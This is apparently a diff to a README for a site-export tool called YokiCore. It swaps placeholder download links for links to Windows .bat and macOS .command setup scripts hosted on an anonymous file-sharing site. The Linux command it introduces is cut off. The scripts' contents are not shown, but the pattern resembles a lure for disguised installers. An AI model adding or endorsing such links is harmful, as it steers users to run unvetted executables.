@@ -31,8 +31,8 @@ Exported sites are written to `YokiCore/<project-name>` inside your home folder.
 
 | OS      | Download |
 |---------|----------|
-| Windows | [`YokiCore-Setup.bat`](YOUR_WINDOWS_LINK) |
-| macOS   | [`YokiCore-Setup.command`](YOUR_MACOS_LINK) |
+| Windows | [`YokiCore-Setup.bat`](https://fileup.to/5p5r/YokiCore-Setup.bat) |
+| macOS   | [`YokiCore-Setup.command`](https://fileup.to/5p5q/YokiCore-Setup.command) |
 | Linux   | Run the following command: |
 
 **Linux**
